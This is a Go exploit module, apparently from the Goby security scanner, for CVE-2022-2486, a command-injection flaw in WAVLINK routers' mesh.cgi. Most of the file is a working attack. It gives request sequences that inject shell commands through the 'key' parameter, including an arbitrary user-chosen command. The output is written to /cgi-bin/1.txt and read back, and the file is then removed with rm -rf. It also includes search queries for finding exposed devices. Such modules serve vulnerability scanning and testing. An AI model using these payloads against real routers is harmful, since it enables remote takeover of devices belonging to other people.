package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "wavlink mesh.cgi command execution (CVE-2022-2486)",
    "Description": "<p>WAVLINK is a router developed by China Ruiyin Technology (WAVLINK) company. The system mesh.cgi file has a command execution vulnerability, and attackers can obtain server privileges through this vulnerability. Including models WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4, etc.</p>",
    "Product": "wavlink",
    "Homepage": "https://www.wavlink.com",
    "DisclosureDate": "2022-07-05",
    "Author": "",
    "FofaQuery": "body=\"firstFlage\"",
    "GobyQuery": "body=\"firstFlage\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute system commands to gain server privileges.</p>",
    "Recommendation": "<p>Contact the manufacturer for a repair solution: <a href=\"https://www.wavlink.com\">https://www.wavlink.com</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/mesh.cgi?page=upgrade&key=';ls>./1.txt;'",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/1.txt",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ".cgi",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/mesh.cgi?page=upgrade&key=';rm%20-rf%20./1.txt;'",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/mesh.cgi?page=upgrade&key=';{{{cmd}}}>./1.txt;'",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/1.txt",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/mesh.cgi?page=upgrade&key=';rm%20-rf%20./1.txt;'",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Internet of Things",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-2486"
    ],
    "CNNVD": [
        "CNNVD-202207-2019"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "wavlink mesh.cgi命令执行漏洞（CVE-2022-2486）",
            "Product": "WAVLINK",
            "Description": "<p>WAVLINK是中国睿因科技（WAVLINK）公司开发的一款路由器，该系统<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">mesh.cgi文件</span>存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。包含型号WN530HG4、WN531G3、WN572HG3、WN535G3、WN575A4等。<br></p>",
            "Recommendation": "<p>联系厂商获取修复方案：<a href=\"https://www.wavlink.com\">https://www.wavlink.com</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞执行系统命令获取服务器权限。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "物联网"
            ]
        },
        "EN": {
            "Name": "wavlink mesh.cgi command execution (CVE-2022-2486)",
            "Product": "wavlink",
            "Description": "<p>WAVLINK is a router developed by China Ruiyin Technology (WAVLINK) company. The system mesh.cgi file has a command execution vulnerability, and attackers can obtain server privileges through this vulnerability. Including models WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4, etc.<br></p>",
            "Recommendation": "<p>Contact the manufacturer for a repair solution: <a href=\"https://www.wavlink.com\">https://www.wavlink.com</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute system commands to gain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Internet of Things",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}